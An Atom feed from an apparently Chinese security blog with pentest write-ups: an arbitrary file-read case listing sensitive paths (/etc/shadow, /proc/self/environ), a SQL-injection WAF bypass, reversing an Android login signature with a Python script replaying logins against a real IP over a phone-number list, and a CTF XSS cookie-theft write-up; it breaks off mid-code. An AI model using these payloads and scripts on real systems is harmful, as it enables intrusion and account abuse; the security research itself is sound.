<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[xd_xd's blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://xdxd.love/"/>
  <updated>2016-05-24T09:11:44.000Z</updated>
  <id>http://xdxd.love/</id>
  
  <author>
    <name><![CDATA[xd_xd]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[一个任意文件读取漏洞记录]]></title>
    <link href="http://xdxd.love/2016/05/23/%E4%B8%80%E4%B8%AA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/05/23/一个任意文件读取漏洞分析/</id>
    <published>2016-05-23T07:27:05.000Z</published>
    <updated>2016-05-24T09:11:44.000Z</updated>
    <content type="html"><![CDATA[<h1 id="黑盒测试">黑盒测试</h1><p>黑盒测试发现某个接口存在任意文件读取的漏洞。<br><img src="/images/wenjianduqu1.gif" alt=""><br>首选判断是文件读取还是文件包含，因为file_get_content(“/etc/passwd”)和include(“/etc/passwd”)黑盒来看的表现可能一样。而文件包含是可以getshell的，文件读取就只能读取文件。可以通过尝试读取相对路径的脚本文件，比如<code>/read.php?file=read.php</code>的方式，如果可以读取到文件源码，说明是文件读取，如果不能读取到文件源码说明是文件包含。</p>
<h1 id="文件读取">文件读取</h1><p>服务器上有价值的文件主要可以分为3类。通用的系统/应用配置文件，个性化的文件以及web应用的源码文件。而想要读取到一个文件只需要知道这个文件的绝对路径或者相对路径就可以了。</p>
<p>把web应用的源码单独出来是觉得应用源码可以很方便的通过相对路径获取到，不需要费劲得到源码的绝对路径。系统的通用配置文件比如</p>
<pre><code><span class="regexp">/etc/</span>passwd
<span class="regexp">/etc/my</span>.cnf
<span class="regexp">/etc/</span>shadow
<span class="regexp">/etc/</span>sysconfig<span class="regexp">/network-scripts/i</span>fcfg-eth0   ip地址
<span class="regexp">/etc/</span>hosts                                  通常配置了一些内网域名
</code></pre><p>等等可以通过字典的方式来猜解。</p>
<p>这个案例通过passwd中获得的用户来获取到了这个用户的bash_history，从bash_history获取到了一些压缩包的地址。从而读取到了个性化的文件,一些压缩包的文件。<br><img src="/images/wenjianduqu2.png" alt=""><br><img src="/images/wenjianduqu3.png" alt=""></p>
<p>通过mysql的配置文件得知了数据的存储目录。通过直接读取数据库文件可以获取到数据库内的信息。</p>
<p><img src="/images/wenjianduqu4.png" alt=""></p>
<p>在说到文件包含利用的时候，会讲到有个小技巧，某些情况下可以包含proc下的文件。文件读取的情况下当然可以可以读取proc目录下的文件来获得更多系统的信息。</p>
<p><img src="/images/wenjianduqu5.png" alt=""></p>
<pre><code>/<span class="keyword">proc</span>/sched_debug  提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
/<span class="keyword">proc</span>/mounts 挂载的文件系统列表
/<span class="keyword">proc</span>/net/arp  arp表，可以获得内网其他机器的地址
/<span class="keyword">proc</span>/net/route 路由表信息
/<span class="keyword">proc</span>/net/tcp <span class="keyword">and</span> /<span class="keyword">proc</span>/net/udp  活动连接的信息
/<span class="keyword">proc</span>/net/fib_trie 路由缓存
/<span class="keyword">proc</span>/version  内核版本
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/cmdline 可能包含有用的路径信息
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/environ 程序运行的环境变量信息，可以用来包含getshell
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/cwd     当前进程的工作目录
/<span class="keyword">proc</span>/[<span class="type">PID</span>]/fd/[<span class="comment">#]  访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log</span>
</code></pre><p>fuzz字典：</p>
<pre><code>/<span class="keyword">proc</span>/self/cmdline
/<span class="keyword">proc</span>/self/stat
/<span class="keyword">proc</span>/self/status
/<span class="keyword">proc</span>/self/environ
/<span class="keyword">proc</span>/verison
/<span class="keyword">proc</span>/cmdline
/<span class="keyword">proc</span>/self/cwd
/<span class="keyword">proc</span>/self/fd/<span class="number">0</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">1</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">2</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">3</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">4</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">5</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">6</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">7</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">8</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">9</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">10</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">11</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">12</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">13</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">14</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">15</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">16</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">17</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">18</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">19</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">20</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">21</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">22</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">23</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">24</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">25</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">26</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">27</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">28</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">29</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">30</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">31</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">32</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">33</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">34</span>
/<span class="keyword">proc</span>/self/fd/<span class="number">35</span>
/<span class="keyword">proc</span>/sched_debug
/<span class="keyword">proc</span>/mounts
/<span class="keyword">proc</span>/net/arp
/<span class="keyword">proc</span>/net/route
/<span class="keyword">proc</span>/net/tcp
/<span class="keyword">proc</span>/net/udp
/<span class="keyword">proc</span>/net/fib_trie
/<span class="keyword">proc</span>/version
</code></pre><h1 id="漏洞分析">漏洞分析</h1><p>读取到应用代码，对漏洞原因进行分析。</p>
<p>通过入口初始化文件读取到配置文件。</p>
<pre><code><span class="comment">/* 初始化设置 END */</span>
<span class="comment">//--------------------------------------------------</span>
<span class="keyword">require</span> (ROOT_PATH . ADMIN_PATH . <span class="string">'/includes/config.php'</span>);
define(<span class="string">'CLS_PATH'</span>, ROOT_PATH . ADMIN_PATH . <span class="string">'/'</span>);
<span class="comment">/**
 - <span class="doctag">@author</span>  jonah.fu
 - <span class="doctag">@date</span>    2012-03-28
 */</span>
<span class="keyword">include</span> ROOT_PATH . ADMIN_PATH . <span class="string">'/includes/base/autoload.class.php'</span>;
autoloader::init();
<span class="comment">/* 初始化memcached */</span>
<span class="comment">//$cache = new base_memcached();</span>
</code></pre><p>配置文件中自然有数据库账号，这个暂且不说。先看autoload.class.php。autoload实现自动加载类的功能。通过其实现方式拼接出存在漏洞的action类文件路径。</p>
<pre><code>/**
 * 固定路径的class 类文件 以.class.php 结尾
 */
private <span class="keyword">function</span> base_class(<span class="variable">$className</span>) {
    // echo <span class="string">"1 $className&lt;br /&gt;"</span>;
    <span class="variable">$path</span> = array();
    <span class="variable">$pathDir</span> = array();
    <span class="variable">$path</span> = explode(<span class="string">'_'</span>, <span class="variable">$className</span>);
    <span class="variable">$arrCount</span> = count(<span class="variable">$path</span>) - <span class="number">1</span>;
    <span class="variable">$pathDir</span> = implode(<span class="string">"/"</span>, array_slice(<span class="variable">$path</span>, <span class="number">0</span>, <span class="variable">$arrCount</span>));
    // set_include_path(get_include_path() . PATH_SEPARATOR . <span class="string">'/includes/'</span> . <span class="variable">$pathDir</span> . <span class="string">"/"</span>);
    set_include_path(CLS_PATH . <span class="string">"/includes/"</span> . <span class="variable">$pathDir</span>);
    spl_autoload_extensions(<span class="string">'.class.php'</span>);
    spl_autoload(<span class="variable">$path</span>[<span class="variable">$arrCount</span>]);
}
</code></pre><p>读到关键函数的源码：</p>
<pre><code>class models_index {
    public function newsList(<span class="variable">$url</span> = <span class="string">''</span>) {
        <span class="variable">$list</span> = @file_get_contents(<span class="variable">$this</span> -&gt; host.<span class="variable">$url</span>);
        return <span class="variable">$list</span>? <span class="variable">$list</span> : <span class="variable">$this-</span>&gt;getErr(<span class="string">'出错了，没有找到该页面！'</span>);
    public function detail(<span class="variable">$url</span>) {
        <span class="variable">$content</span> = @file_get_contents(<span class="variable">$url</span>);
        return <span class="variable">$content</span>? <span class="variable">$content</span> : <span class="variable">$this-</span>&gt;getErr(<span class="string">'404'</span>,<span class="string">'出错了，没有找到该页面！'</span>);
    }
</code></pre><p>detail 方法获取到了url参数之后直接file_get_contents输出。最典型的任意文件读取漏洞。</p>
<h1 id="修复方案">修复方案</h1><p>白名单用户的输入就可以了。</p>
<h1 id="参考资料">参考资料</h1><p><a href="http://zone.wooyun.org/content/27434" target="_blank" rel="external">http://zone.wooyun.org/content/27434</a><br><a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/" target="_blank" rel="external">https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="黑盒测试">黑盒测试</h1><p>黑盒测试发现某个接口存在任意文件读取的漏洞。<br><img src="/images/wenjianduqu1.gif" alt=""><br>首选判断是文件读取还是文件包含，因为file_get_content(“/etc/]]>
    </summary>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[sql注入之waf绕过小案例]]></title>
    <link href="http://xdxd.love/2016/05/23/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bwaf%E7%BB%95%E8%BF%87%E5%B0%8F%E6%A1%88%E4%BE%8B/"/>
    <id>http://xdxd.love/2016/05/23/sql注入之waf绕过小案例/</id>
    <published>2016-05-23T02:59:55.000Z</published>
    <updated>2016-05-23T05:55:25.000Z</updated>
    <content type="html"><![CDATA[<h1 id="mysql">mysql</h1><p>大于号，等于号等无法使用，使用减号绕过。</p>
<pre><code><span class="keyword">if</span>(ASCII(mid(database(),<span class="number">1</span>,<span class="number">1</span>))-<span class="number">104</span>,<span class="number">7</span>,<span class="number">6</span>)=<span class="number">6</span> 
</code></pre><p>ASCII(mid(database(),1,1))-104 等于0的时候为false，其他为true。</p>
<h1 id="mssql">mssql</h1><pre><code>长度函数用len  截取函数用<span class="function"><span class="title">right</span><span class="params">()</span></span>  用户用suser_sname 
</code></pre><p>#</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="mysql">mysql</h1><p>大于号，等于号等无法使用，使用减号绕过。</p>
<pre><code><span class="keyword">if</span>(ASCII(mid(database(),<span class="number">1<]]>
    </summary>
    
      <category term="sqli" scheme="http://xdxd.love/tags/sqli/"/>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一次破解apk通信签名进行漏洞挖掘的记录]]></title>
    <link href="http://xdxd.love/2016/05/10/%E4%B8%80%E6%AC%A1%E7%A0%B4%E8%A7%A3apk%E9%80%9A%E4%BF%A1%E7%AD%BE%E5%90%8D%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%9A%84%E8%AE%B0%E5%BD%95/"/>
    <id>http://xdxd.love/2016/05/10/一次破解apk通信签名进行漏洞挖掘的记录/</id>
    <published>2016-05-10T07:58:23.000Z</published>
    <updated>2016-05-12T06:18:46.000Z</updated>
    <content type="html"><![CDATA[<h1 id="背景">背景</h1><p>相对一个app的登录接口进行安全性分析，使用burpsuite无法抓到通信包。但是可以看到app已经成功和服务器通信了。猜测没有使用http协议，而是使用了其他协议。</p>
<h1 id="协议分析">协议分析</h1><p>使用wireshark抓包分析。发现使用了服务器的30001端口通信。<br><img src="/images/apkqianming1.png" alt=""><br><img src="/images/apkqianming2.png" alt=""><br><img src="/images/apkqianming3.png" alt=""><br>可以看到用户名，密码，以及时间戳。尝试截止重放这个包。发现提示时间不对，应该是验证了时间戳。</p>
<h1 id="apk逆向分析">apk逆向分析</h1><p>反编译apk。搜索关键字，定位到如下代码：</p>
<pre><code>String valueOf = String.valueOf(System.currentTimeMillis())<span class="comment">;</span>
       newBuilder.f(valueOf)<span class="comment">;</span>
       newBuilder.g(Token.getSignature(valueOf.getBytes(Charset.forName(HTTP.UTF_8))))<span class="comment">;</span>
       return newBuilder<span class="comment">;</span>
</code></pre><p>通过观察协议数据包，一直数据包中有时间戳，而这个getSignature是对System.currentTimeMillis()进行了签名，拼接到了请求中。猜测这个函数是最终的签名函数，跟进getSignature。</p>
<pre><code><span class="keyword">package</span> com.fangdd.app.utils;

<span class="keyword">import</span> com.fangdd.app.ui.widget.ao;
<span class="keyword">import</span> java.security.Key;
<span class="keyword">import</span> java.security.MessageDigest;
<span class="keyword">import</span> javax.crypto.Mac;
<span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;

<span class="keyword">public</span> class Token {
    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">String</span> getSignature(<span class="built_in">byte</span>[] bArr);

    <span class="keyword">static</span> {
        System.loadLibrary(<span class="string">"fddutils"</span>);
    }

    <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] encodeHmacSha1(<span class="built_in">byte</span>[] bArr, <span class="built_in">byte</span>[] bArr2) {
        <span class="built_in">char</span>[] cArr = <span class="keyword">new</span> <span class="built_in">char</span>[]{<span class="string">'0'</span>, <span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>, <span class="string">'d'</span>, <span class="string">'e'</span>, <span class="string">'f'</span>};
        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();
        <span class="keyword">try</span> {
            Key secretKeySpec = <span class="keyword">new</span> SecretKeySpec(bArr2, <span class="string">"HmacSHA1"</span>);
            Mac instance = Mac.getInstance(<span class="string">"HmacSHA1"</span>);
            instance.init(secretKeySpec);
            <span class="keyword">for</span> (<span class="built_in">byte</span> b : instance.doFinal(bArr)) {
                stringBuilder.<span class="built_in">append</span>(<span class="keyword">new</span> <span class="built_in">char</span>[]{cArr[(b &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>], cArr[b &amp; <span class="number">15</span>]});
            }
            <span class="keyword">return</span> stringBuilder.toString().getBytes(<span class="string">"UTF-8"</span>);
        } <span class="keyword">catch</span> (Exception e) {
            System.err.<span class="built_in">println</span>(<span class="string">"encodeHmacSha1 error,message = invalid key, key = {}"</span> + bArr2.toString());
            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">0</span>];
        }
    }

    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">String</span> encodeSha1(<span class="keyword">String</span> <span class="built_in">str</span>) {
        <span class="built_in">int</span> i = <span class="number">0</span>;
        <span class="keyword">try</span> {
            MessageDigest instance = MessageDigest.getInstance(<span class="string">"SHA"</span>);
            instance.update(<span class="built_in">str</span>.getBytes());
            <span class="built_in">byte</span>[] digest = instance.digest();
            StringBuffer stringBuffer = <span class="keyword">new</span> StringBuffer();
            <span class="keyword">for</span> (<span class="built_in">byte</span> b : digest) {
                stringBuffer.<span class="built_in">append</span>(Integer.toString((b &amp; ao.b) + <span class="number">256</span>, <span class="number">16</span>).substring(<span class="number">1</span>));
            }
            StringBuffer stringBuffer2 = <span class="keyword">new</span> StringBuffer();
            <span class="keyword">while</span> (i &lt; digest.length) {
                <span class="keyword">String</span> toHexString = Integer.toHexString(digest[i] &amp; ao.b);
                <span class="keyword">if</span> (toHexString.length() == <span class="number">1</span>) {
                    stringBuffer2.<span class="built_in">append</span>(<span class="string">'0'</span>);
                }
                stringBuffer2.<span class="built_in">append</span>(toHexString);
                i++;
            }
            <span class="keyword">return</span> stringBuffer2.toString();
        } <span class="keyword">catch</span> (Exception e) {
            e.printStackTrace(System.err);
            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">String</span>();
        }
    }
}
</code></pre><p>发现调用的是so中的函数。</p>
<h1 id="smali插桩定位关键函数">smali插桩定位关键函数</h1><p>采用<a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">Smali注入之打造属于自己的安卓crack利器</a></p>
<pre><code><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lcrack;</span>
<span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span>
<span class="keyword">.source</span> <span class="string">"crack.java"</span>

<span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> static</span><span class="function"> log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
<span class="keyword">    .locals</span> 1
<span class="keyword">    .prologue</span>

   <span class="instruction"> const-string </span><span class="variable">v0</span>, <span class="string">"info"</span>
   <span class="instruction"> invoke-static </span>{<span class="variable">v0</span>, <span class="variable">p0</span>}, <span class="class">Landroid/util/Log;</span><span class="function">-&gt;d(</span><span class="class">Ljava/lang/String;</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>I
   <span class="instruction"> return-void
</span><span class="keyword">.end method</span>
</code></pre><p>打印getsignature的值和抓包对比。</p>
<pre><code>invoke-static {<span class="variable">v1</span>}, <span class="class">Lcom/fangdd/app/utils/Token;</span><span class="function">-&gt;getSignature(</span><span class="keyword">[</span>B<span class="function">)</span><span class="class">Ljava/lang/String;</span><span class="instruction">
move-result-object </span><span class="variable">v1</span>
<span class="instruction">
invoke-static </span>{<span class="variable">v1</span>}, <span class="class">Lcrack;</span><span class="function">-&gt;log(</span><span class="class">Ljava/lang/String;</span><span class="function">)</span>V
</code></pre><p>发现确实是getSignature作为签名函数。</p>
<p><img src="/images/apkqianming4.png" alt=""></p>
<h1 id="编写apk调用so">编写apk调用so</h1><p>使用androidstudio作为ide，在src/main目录下新建jniLibs/armeabi文件夹，将so文件放在该文件夹下面。具体详细的过程可以参考<a href="http://seniorzhai.github.io/2015/02/13/AndroidStudio%E8%B0%83%E7%94%A8so%E6%96%87%E4%BB%B6/" target="_blank" rel="external">AndroidStudio调用so文件</a>。按照以前apk的中包名，新建一模一样的包。详细的测试代码见附件。测试调用getSignature方法：</p>
<pre><code>public <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword"><span class="keyword">extends</span></span> <span class="title">ActionBarActivity</span> {</span>

    <span class="annotation">@Override</span>
    <span class="keyword">protected</span> void onCreate(<span class="type">Bundle</span> savedInstanceState) {
        <span class="keyword">super</span>.onCreate(savedInstanceState);
        setContentView(<span class="type">R</span>.layout.activity_main);
        <span class="type">String</span> <span class="class"><span class="keyword">object</span>;</span>
        <span class="class"><span class="keyword">object</span> =</span> <span class="type">String</span>.valueOf(<span class="type">System</span>.currentTimeMillis());
        <span class="type">Token</span>.getSignature((byte[])<span class="class"><span class="keyword">object</span>.<span class="title">getBytes</span>(</span><span class="type">Charset</span>.forName(<span class="string">"UTF-8"</span>)));
        <span class="type">Log</span>.d(<span class="string">"111time"</span>,<span class="class"><span class="keyword">object</span>);</span>
        <span class="type">Log</span>.d(<span class="string">"111"</span>,<span class="type">Token</span>.getSignature((byte[])<span class="class"><span class="keyword">object</span>.<span class="title">getBytes</span>(</span><span class="type">Charset</span>.forName(<span class="string">"UTF-8"</span>))));
        <span class="type">System</span>.out.println(<span class="string">"test"</span>);
    }
</code></pre><p>查看logcat输出。</p>
<p><img src="/images/apkqianming5.png" alt=""></p>
<p>获得时间戳和时间戳的签名。采用以下脚本测试：</p>
<pre><code><span class="comment">#!/usr/bin/env python</span>

<span class="keyword">import</span> socket
<span class="keyword">import</span> struct
<span class="keyword">import</span> time



<span class="function"><span class="keyword">def</span> <span class="title">h2bin</span><span class="params">(x)</span>:</span>
    <span class="keyword">return</span> x.replace(<span class="string">' '</span>, <span class="string">''</span>).replace(<span class="string">'\n'</span>, <span class="string">''</span>).decode(<span class="string">'hex'</span>)

denglu1 = h2bin(<span class="string">''' c8 01 08 05 10 00 30 02  3a 05 34 2e 34 2e 34 42 
 24 48 54 43 20 4f 6e 65  20 2d 20 34 2e 34 2e 34 
 20 2d 20 41 50 49 20 31  39 20 2d 20 31 30 38 30 
 78 31 39 32 30 48 17 52  03 36 2e 34 7a 3b 08 02 
 12 37 0a 0b '''</span>)

denglu2 = h2bin(<span class="string">''' 12 
 06 31 32 33 34 35 36 5a  20 64 61 64 64 61 37 65 
 66 32 30 34 37 33 36 38  33 61 38 34 65 61 34 31 
 65 65 61 31 61 38 61 30  31 8a 01 03 66 64 64 a2 
 01 0d '''</span>)

denglu3 = h2bin(<span class="string">''' aa 
 01 38 4d 54 45 33 5a 6d  46 68 4d 6d 49 78 4e 57 
 45 7a 4e 57 59 31 4d 7a  63 78 4e 47 51 77 4d 44 
 55 32 59 57 4e 6d 5a 44  6c 6b 5a 54 42 68 4f 44 
 63 32 4e 57 49 34 4e 67  3d 3d                          
'''</span>)

denglu4 = h2bin(<span class="string">'''aa 
 01 38 '''</span>)
HOST=<span class="string">'103.235.228.10'</span>
PORT=<span class="number">30001</span>
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((HOST,PORT))

phonefile = open(<span class="string">'/Users/security/dict/13Wphone.txt'</span>)
<span class="keyword">for</span> phone <span class="keyword">in</span> phonefile:
    <span class="comment"># denglu = denglu1+struct.pack('11s',phone)+denglu2+struct.pack('13s',str(int(time.time()*1000)))+denglu3</span>
    denglu = denglu1+struct.pack(<span class="string">'11s'</span>,phone) +denglu2+<span class="string">'1463032691831'</span>+denglu4 +<span class="string">'MTQzMmUyYTYwMjFmNGU2ODM5YWM2MDQwOTdkZWFkNDY3NzdkZGY2Yw=='</span>
    <span class="keyword">print</span> <span class="string">'connected'</span>
    s.sendall(denglu)
    <span class="keyword">print</span> <span class="string">'sendall'</span>
    data=s.recv(<span class="number">1024</span>)
    <span class="keyword">print</span> data
    <span class="comment"># print phone</span>
<span class="comment"># print denglu</span>
s.close()
</code></pre><p>发现可以成功调用登录接口。</p>
<h1 id="编写poc">编写poc</h1><h1 id="参考资料">参考资料</h1><p><a href="http://drops.wooyun.org/tips/2871" target="_blank" rel="external">http://drops.wooyun.org/tips/2871</a><br><a href="http://drops.wooyun.org/tips/2986" target="_blank" rel="external">http://drops.wooyun.org/tips/2986</a><br><a href="http://www.52pojie.cn/thread-255754-1-1.html" target="_blank" rel="external">http://www.52pojie.cn/thread-255754-1-1.html</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="背景">背景</h1><p>相对一个app的登录接口进行安全性分析，使用burpsuite无法抓到通信包。但是可以看到app已经成功和服务器通信了。猜测没有使用http协议，而是使用了其他协议。</p>
<h1 id="协议分析">协议分析</h1><p>使用wi]]>
    </summary>
    
      <category term="签名逆向" scheme="http://xdxd.love/tags/%E7%AD%BE%E5%90%8D%E9%80%86%E5%90%91/"/>
    
      <category term="移动安全" scheme="http://xdxd.love/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[imagemagic RCE漏洞分析与利用]]></title>
    <link href="http://xdxd.love/2016/05/05/imagemagic-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://xdxd.love/2016/05/05/imagemagic-RCE漏洞分析与利用/</id>
    <published>2016-05-05T08:20:21.000Z</published>
    <updated>2016-05-09T02:58:04.000Z</updated>
    <content type="html"><![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>目前的分析讲的比较清楚了。概括来讲imagemagic允许使用外部库处理图片。这个特性叫做delegate。通过使用system()调用命令行来实现的。命令预先配置在delegates.xml中。接受输入图片参数再完成最后的命令拼接。就是拼接命令的过程，出现了命令注入的漏洞。</p>
<h1 id="代码分析">代码分析</h1><p>使用正常png图片执行命令。</p>
<h1 id="参考资料">参考资料</h1><p><a href="https://imagetragick.com/" target="_blank" rel="external">https://imagetragick.com/</a><br><a href="http://drops.wooyun.org/papers/15589" target="_blank" rel="external">http://drops.wooyun.org/papers/15589</a><br><a href="http://360adlab.com/?p=1895" target="_blank" rel="external">http://360adlab.com/?p=1895</a><br><a href="http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1" target="_blank" rel="external">http://ricterz.me/posts/Write%20Up%3A%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1</a><br><a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">https://github.com/ImageTragick/PoCs</a><br><a href="http://weibo.com/p/1001603971443670055277" target="_blank" rel="external">http://weibo.com/p/1001603971443670055277</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="漏洞原理">漏洞原理</h1><p>目前的分析讲的比较清楚了。概括来讲imagemagic允许使用外部库处理图片。这个特性叫做delegate。通过使用system()调用命令行来实现的。命令预先配置在delegates.xml中。接受输入图片参数再完成最后的命令]]>
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[2016 CCTF writeup之萝莉之旅]]></title>
    <link href="http://xdxd.love/2016/05/03/2016-CCTF%E4%B9%8B%E8%90%9D%E8%8E%89%E4%B9%8B%E6%97%85/"/>
    <id>http://xdxd.love/2016/05/03/2016-CCTF之萝莉之旅/</id>
    <published>2016-05-03T03:33:35.000Z</published>
    <updated>2016-05-03T08:45:16.000Z</updated>
    <content type="html"><![CDATA[<p><img src="/images/cctf4.png" alt=""></p>
<h1 id="CCTF感受">CCTF感受</h1><p>周六花了一天时间做了下CCTF的pentest。还是有不少有意思的收获。这个名字叫pentest，而不是web，感觉也是花了心思的，感谢花时间精力准备的CCTF。loli1，loli2侥幸拿了一血，先装个逼。<br><img src="/images/cctf1.png" alt=""></p>
<h1 id="loli之旅">loli之旅</h1><p>打开首页萌了一脸，羞羞的图片，果然是loli.club啊。右键看了一下源码，除了一个注释貌似没有啥其他的信息了。</p>
<pre><code><span class="comment">&lt;!--
powered by PockyNya
诚招前端，请联系邮箱：pocky@loli.club
--&gt;</span>
</code></pre><p>google直接搜索PockyNya，找到其github。</p>
<p><img src="/images/cctf2.png" alt=""></p>
<p>分析第一个仓库pyprint:<br><img src="/images/cctf3.png" alt=""></p>
<p>可以找到一个博客地址：<a href="http://pocky.loli.club:41293/" target="_blank" rel="external">http://pocky.loli.club:41293/</a></p>
<p>有了网址和源码，自然是要对源码做一番审计。这里我其实是用了一个比较猥琐的方式快速找到了源码中的漏洞。<br>在PockNya的github主页上，可以看到他follow了一个人，RicterZ，点进去可以看到自然是这道题目的作者了。由于平时就关注了RicterZ的github和博客。在RicterZ的github也可以看到pyprint这个仓库，是自己博客的开源代码。所以接下来就是把两个仓库都clone下来，diff了一下。~~~</p>
<p>其实对于pyprint这个代码的审计，读一下commit时的comment可以发现很多信息，比直接看代码可以省不少功夫。不过有了diff大法，一切都是浮云。<br><img src="/images/cctf6.png" alt=""></p>
<h2 id="漏洞一">漏洞一</h2><p><img src="/images/cctf5.png" alt=""></p>
<p>看到登录页面login多了一个flag参数，查看模板文件，直接输出在了页面中，存在一个反射XSS。</p>
<pre><code>&lt;form class=<span class="string">"form-horizontal login-form"</span> role=<span class="string">"form"</span> action=<span class="string">"/login?flag="</span> <span class="keyword">method</span>=<span class="string">"post"</span>&gt;
</code></pre><p><img src="/images/cctf7.png" alt=""></p>
<p>反射XSS需要绕过浏览器audit，根据博客文章提示，找到xss地址之后，发到作者邮箱。试了一下才知道，这个XSS是个意外，很快就被修复了。</p>
<p><img src="/images/cctf8.png" alt=""></p>
<h2 id="漏洞二">漏洞二</h2><p><img src="/images/cctf9.png" alt=""></p>
<p>发现addpost这个方法的权限验证去掉了。查看相关模板，发现去掉了urlencode编码。导致越权发布文章，文章内容可以存储型XSS。根据代码中的接口和参数拼接请求。发布存储型XSS文章。将地址发给作者邮箱，获得cookie。cookie中flag参数解码就是最终的flag。</p>
<h2 id="漏洞三">漏洞三</h2><p><img src="/images/cctf10.png" alt=""></p>
<p>FileReadHandler存在任意文件读取的漏洞，看到这里很开心，可是被注释掉了。所有是逗你玩的代码了~~<br><img src="/images/cctf11.png" alt=""></p>
<h2 id="漏洞四">漏洞四</h2><p><img src="/images/cctf12.png" alt=""><br>这里其实也不算漏洞，看到不一样的代码就跟进去看看做了啥。查看日志的时候，验证了cookie。这里当时不记得怎么弄的了，xss打到的cookie早就加了进去，直接拼日志的地址就可以访问了。现在来看只要本地伪造一个cookie就可以绕过这个验证？添加cookie之后可以查看到一篇一个lua脚本的日志。</p>
<p><img src="/images/cctf13.png" alt=""></p>
<p>lua脚本源码：</p>
<pre><code><span class="operator"><span class="keyword">do</span>
